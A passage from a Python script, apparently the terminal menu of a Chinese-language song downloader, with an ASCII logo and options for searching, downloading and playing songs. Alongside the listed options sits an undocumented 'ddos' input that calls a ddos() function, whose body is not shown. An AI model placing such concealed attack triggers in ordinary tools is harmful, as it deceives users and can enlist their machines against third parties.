   Logo = ["\033[36m\033[H\033[2J\033[3J","███╗   ███╗██╗   ██╗███████╗██╗ ██████╗","████╗ ████║██║   ██║██╔════╝██║██╔════╝","██╔████╔██║██║   ██║███████╗██║██║","██║╚██╔╝██║██║   ██║╚════██║██║██║","██║ ╚═╝ ██║╚██████╔╝███████║██║╚██████╗","╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝ ╚═════╝","\033[35m","██████╗  ██████╗ ██╗    ██╗███╗   ██╗","██╔══██╗██╔═══██╗██║    ██║████╗  ██║","██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║","██║  ██║██║   ██║██║███╗██║██║╚██╗██║","██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║","╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝","\033[34m","██╗      ██████╗  █████╗ ██████╗","██║     ██╔═══██╗██╔══██╗██╔══██╗","██║     ██║   ██║███████║██║  ██║","██║     ██║   ██║██╔══██║██║  ██║","███████╗╚██████╔╝██║  ██║██████╔╝","╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝","\033[0m"]
   width = shutil.get_terminal_size().columns
   for _print in Logo:
     time.sleep(print_sleep)
     wide = len(_print)
     if wide < width: wide = (width  - wide) // 2
     else: wide = 0
     print(" "*wide,_print)
   while True:
      print("─=≡Σ((( つ•̀ω•́)つ" , "  "*((width-50)//2) , f"\033[1;32m作者: \033[97m{Author_name}\033[0m")
      print("\n\033[1;37;44m 欢迎使用歌曲下载器 \033[0m")
      print("  \033[1;37m请输入序号以选择功能:\033[0m")
      print("  \033[1;33m1)\033[0m \033[1;32m获取网络热门歌曲\033[0m")
      print("  \033[1;33m2)\033[0m \033[1;34m搜索你喜欢听的歌曲\033[0m")
      print("  \033[1;33m3)\033[0m \033[1;35m修改搜索阈值\033[0m")
      print("  \033[1;33m4)\033[0m \033[1;31m启动播放器\033[0m")
      print("  \033[1;33m5)\033[0m \033[1;97m启用GUI(实验性)\033[0m")
      print("  \033[1;33m6)\033[0m \033[1;36m退出脚本\033[0m\n\n")
      print("\r\033[K\033[1;37m┌─ 请输入功能序号 ──────────────┐\033[0m")
      choices = input(f"\r\033[K\033[1;37m└─▶ \033[0m")
      if choices == "1":
        get_music("musicChart",'null',30)
      elif choices == "2":
        singer = input(f"\r\033[K\033[1;33;4m 请输入歌曲名称 \033[0m\033[1;37m : \033[0m")
        if singer == "": print("\r\033[K输入不能为空....")
        else: get_music("search",singer,mun)
      elif choices == "3":
        tmp = input(f"\r\033[K\033[1;35;4m输入搜索阈值[当前数值: {mun}]\033[0m\033[1;37m : \033[0m")
        if f"{tmp}".isnumeric(): mun = int(tmp)
        else: print("\r\033[K输入的数值不标准")
      elif choices == "4":
        player()
      elif choices == "5":
        play_gui()
      elif choices == "6":
        print("\033[1;32m[*] \033[35m退出\033[34m程序...\033[0m")
        pygame.mixer.quit()
        sys.exit(0)
      elif choices == "ddos":
         ddos()
      elif choices == "true":
         USD_MOD = True
      elif choices == "false":
         USD_MOD = False
      for _print in Logo:
        wide = len(_print)
        if wide < width: wide = (width  - wide) // 2
        else: wide = 0
        print(" "*wide,_print)
if __name__ == "__main__":
   main()